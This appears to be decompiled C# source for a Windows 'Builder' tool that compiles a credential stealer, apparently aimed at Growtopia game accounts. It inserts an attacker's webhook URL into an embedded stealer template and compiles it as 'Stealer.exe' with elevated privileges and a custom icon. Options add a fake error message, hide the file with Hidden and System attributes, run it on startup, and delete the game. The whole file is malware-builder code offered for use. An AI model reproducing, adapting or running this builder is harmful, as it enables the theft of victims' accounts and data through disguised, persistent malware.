using System;
using System.CodeDom.Compiler;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Threading;
using System.Windows.Forms;
using MetroFramework.Controls;
using seesharp2.Properties;

namespace seesharp2
{
	// Token: 0x02000004 RID: 4
	public partial class Builder : Form
	{
		// Token: 0x17000001 RID: 1
		// (get) Token: 0x06000007 RID: 7 RVA: 0x0000215B File Offset: 0x0000035B
		// (set) Token: 0x06000008 RID: 8 RVA: 0x00002163 File Offset: 0x00000363
		private List<string> alldata { get; set; }

		// Token: 0x17000002 RID: 2
		// (get) Token: 0x06000009 RID: 9 RVA: 0x0000216C File Offset: 0x0000036C
		// (set) Token: 0x0600000A RID: 10 RVA: 0x00002174 File Offset: 0x00000374
		private string IcoFilePath { get; set; }

		// Token: 0x0600000B RID: 11 RVA: 0x0000217D File Offset: 0x0000037D
		public Builder()
		{
			this.InitializeComponent();
			this.metroTextBox6.Visible = false;
		}

		// Token: 0x0600000C RID: 12 RVA: 0x00002197 File Offset: 0x00000397
		private void metroTextBox6_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x0600000D RID: 13 RVA: 0x00002199 File Offset: 0x00000399
		private void metroTextBox7_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x0600000E RID: 14 RVA: 0x0000219B File Offset: 0x0000039B
		private void metroTextBox5_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x0600000F RID: 15 RVA: 0x0000219D File Offset: 0x0000039D
		private void metroCheckBox1_CheckedChanged(object sender, EventArgs e)
		{
		}

		// Token: 0x06000010 RID: 16 RVA: 0x0000219F File Offset: 0x0000039F
		private void metroCheckBox2_CheckedChanged(object sender, EventArgs e)
		{
		}

		// Token: 0x06000011 RID: 17 RVA: 0x000021A1 File Offset: 0x000003A1
		private void metroCheckBox5_CheckedChanged(object sender, EventArgs e)
		{
		}

		// Token: 0x06000012 RID: 18 RVA: 0x000021A3 File Offset: 0x000003A3
		private void metroCheckBox6_CheckedChanged(object sender, EventArgs e)
		{
		}

		// Token: 0x06000013 RID: 19 RVA: 0x000021A5 File Offset: 0x000003A5
		private void metroCheckBox4_CheckedChanged(object sender, EventArgs e)
		{
			if (this.metroCheckBox4.Checked)
			{
				this.metroTextBox6.Visible = true;
				return;
			}
			this.metroTextBox6.Visible = false;
		}

		// Token: 0x06000014 RID: 20 RVA: 0x000021D0 File Offset: 0x000003D0
		private void metroButton3_Click(object sender, EventArgs e)
		{
			if (!string.IsNullOrEmpty(this.metroTextBox5.Text))
			{
				SaveFileDialog saveFileDialog = new SaveFileDialog();
				saveFileDialog.FileName = "Stealer.exe";
				saveFileDialog.Filter = "Exe files (*.exe)|*.exe";
				if (saveFileDialog.ShowDialog() == DialogResult.OK)
				{
					this.compile(saveFileDialog.FileName);
					return;
				}
			}
			else
			{
				MessageBox.Show("Missing webhook URL");
			}
		}

		// Token: 0x06000015 RID: 21 RVA: 0x0000222C File Offset: 0x0000042C
		private void metroButton4_Click(object sender, EventArgs e)
		{
			using (new OpenFileDialog())
			{
				OpenFileDialog openFileDialog2 = new OpenFileDialog();
				openFileDialog2.Filter = "Ico files (*ico)|*.ico";
				openFileDialog2.Title = "Select an ico file";
				if (openFileDialog2.ShowDialog() == DialogResult.OK)
				{
					this.IcoFilePath = openFileDialog2.FileName;
					this.metroTextBox7.Clear();
					this.metroTextBox7.Text = this.IcoFilePath;
				}
			}
		}

		// Token: 0x06000016 RID: 22 RVA: 0x000022A8 File Offset: 0x000004A8
		public void compile(string path)
		{
			string text = Resources.Code;
			text = this.BuildBase(text);
			List<string> list = new List<string>();
			list.Add(text);
			string contents = "<?xml version=\"1.0\" encoding=\"utf-8\"?>\r\n<assembly manifestVersion=\"1.0\" xmlns=\"urn:schemas-microsoft-com:asm.v1\">\r\n  <assemblyIdentity version=\"1.0.0.0\" name=\"MyApplication.app\"/>\r\n  <trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v2\">\r\n    <security>\r\n      <requestedPrivileges xmlns=\"urn:schemas-microsoft-com:asm.v3\">\r\n        <requestedExecutionLevel level=\"highestAvailable\" uiAccess=\"false\" />\r\n      </requestedPrivileges>\r\n    </security>\r\n  </trustInfo>\r\n  <compatibility xmlns=\"urn:schemas-microsoft-com:compatibility.v1\">\r\n    <application>\r\n    </application>\r\n  </compatibility>\r\n</assembly>\r\n";
			File.WriteAllText(Application.StartupPath + "\\manifest.manifest", contents);
			CodeDomProvider codeDomProvider = CodeDomProvider.CreateProvider("CSharp");
			CompilerParameters compilerParameters = new CompilerParameters();
			compilerParameters.ReferencedAssemblies.Add("System.Net.dll");
			compilerParameters.ReferencedAssemblies.Add("System.Net.Http.dll");
			compilerParameters.ReferencedAssemblies.Add("System.dll");
			compilerParameters.ReferencedAssemblies.Add("System.Windows.Forms.dll");
			compilerParameters.ReferencedAssemblies.Add("System.Drawing.dll");
			compilerParameters.ReferencedAssemblies.Add("System.Management.dll");
			compilerParameters.ReferencedAssemblies.Add("System.IO.dll");
			compilerParameters.ReferencedAssemblies.Add("System.IO.compression.dll");
			compilerParameters.ReferencedAssemblies.Add("System.IO.compression.filesystem.dll");
			compilerParameters.ReferencedAssemblies.Add("System.Core.dll");
			compilerParameters.ReferencedAssemblies.Add("System.Security.dll");
			compilerParameters.ReferencedAssemblies.Add("System.Diagnostics.Process.dll");
			Path.GetPathRoot(Environment.SystemDirectory) + "Temp";
			compilerParameters.GenerateExecutable = true;
			compilerParameters.OutputAssembly = path;
			compilerParameters.GenerateInMemory = false;
			compilerParameters.TreatWarningsAsErrors = false;
			CompilerParameters compilerParameters2 = compilerParameters;
			compilerParameters2.CompilerOptions += "/t:winexe /unsafe /platform:x86";
			if (!string.IsNullOrEmpty(this.metroTextBox7.Text) || (!string.IsNullOrWhiteSpace(this.metroTextBox7.Text) && this.metroTextBox7.Text.Contains("\\") && this.metroTextBox7.Text.Contains(":") && this.metroTextBox7.Text.Length >= 7))
			{
				CompilerParameters compilerParameters3 = compilerParameters;
				compilerParameters3.CompilerOptions = compilerParameters3.CompilerOptions + " /win32icon:\"" + this.metroTextBox7.Text + "\"";
			}
			else if (!string.IsNullOrEmpty(this.metroTextBox7.Text))
			{
				string.IsNullOrWhiteSpace(this.metroTextBox7.Text);
			}
			Thread.Sleep(100);
			CompilerResults compilerResults = codeDomProvider.CompileAssemblyFromSource(compilerParameters, list.ToArray());
			if (compilerResults.Errors.Count > 0)
			{
				try
				{
					File.Delete(Application.StartupPath + "\\manifest.manifest");
				}
				catch
				{
				}
				using (IEnumerator enumerator = compilerResults.Errors.GetEnumerator())
				{
					while (enumerator.MoveNext())
					{
						object obj = enumerator.Current;
						MessageBox.Show(((CompilerError)obj).ToString());
					}
					return;
				}
			}
			try
			{
				File.Delete(Application.StartupPath + "\\manifest.manifest");
			}
			catch
			{
			}
			MessageBox.Show("Stealer compiled!");
		}

		// Token: 0x06000017 RID: 23 RVA: 0x00002590 File Offset: 0x00000790
		public string BuildBase(string code)
		{
			string text = code.Replace("webhook_url", this.metroTextBox5.Text);
			if (this.metroCheckBox4.Checked && !string.IsNullOrEmpty(this.metroTextBox6.Text))
			{
				text = text.Replace("//FakeErrorMessage", "MessageBox.Show(\"" + this.metroTextBox6.Text + "\",\"Error!\",MessageBoxButtons.OK);");
			}
			if (this.metroCheckBox2.Checked)
			{
				text = text.Replace("//HideStealer", "try { File.SetAttributes(System.Reflection.Assembly.GetEntryAssembly().Location, File.GetAttributes(System.Reflection.Assembly.GetEntryAssembly().Location) | FileAttributes.Hidden | FileAttributes.System); } catch { }");
			}
			if (this.metroCheckBox1.Checked)
			{
				text = text.Replace("//Tracer", "Tracer.TraceSave();");
			}
			if (this.metroCheckBox5.Checked)
			{
				text = text.Replace("//DeleteGrowtopia", "DeleteGrowtopia();");
			}
			if (this.metroCheckBox6.Checked)
			{
				text = text.Replace("//RunOnStartup", "RunOnStartup();");
			}
			return text;
		}
	}
}
